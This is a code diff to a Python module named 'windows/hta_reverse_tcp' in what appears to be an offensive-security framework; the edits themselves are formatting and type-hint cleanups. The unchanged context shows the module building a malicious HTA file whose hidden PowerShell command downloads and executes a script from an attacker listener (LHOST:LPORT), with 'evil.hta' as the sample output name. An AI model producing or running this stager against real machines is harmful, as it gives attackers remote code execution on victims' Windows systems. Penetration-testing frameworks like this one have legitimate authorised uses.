@@ -1,6 +1,8 @@
+from typing import Any
+
 from core.module import BaseModule
 from core.option import Option
-from typing import Dict, Any
+
 
 class Payload(BaseModule):
     Name = "windows/hta_reverse_tcp"
@@ -13,7 +15,13 @@ class Payload(BaseModule):
         self.Options = {
             "LHOST": Option("LHOST", "127.0.0.1", True, "Dinleyen IP."),
             "LPORT": Option("LPORT", 4444, True, "Dinleyen Port."),
-            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: evil.hta).", completion_dir=".")
+            "OUTPUT": Option(
+                "OUTPUT",
+                "",
+                False,
+                "Payload'ı dosyaya kaydet (örn: evil.hta).",
+                completion_dir=".",
+            ),
         }
 
     def generate(self) -> str:
@@ -23,7 +31,7 @@ class Payload(BaseModule):
         # Generate a simple PowerShell command to execute
         # In a real HTA, we'd embed this command to be run via VBScript or JScript WScript.Shell
         ps_command = f"powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/run')\""
-        
+
         # HTA Template
         # This is a basic stub. Usually HTA payloads are more complex to evade detection.
         payload = f"""
@@ -41,9 +49,9 @@ class Payload(BaseModule):
 """
         return payload.strip()
 
-    def run(self, options: Dict[str, Any]):
+    def run(self, options: dict[str, Any]):
         code = self.generate()
-        
+
         output_path = self.get_option_value("OUTPUT")
         if output_path:
             if not output_path.endswith(".hta"):
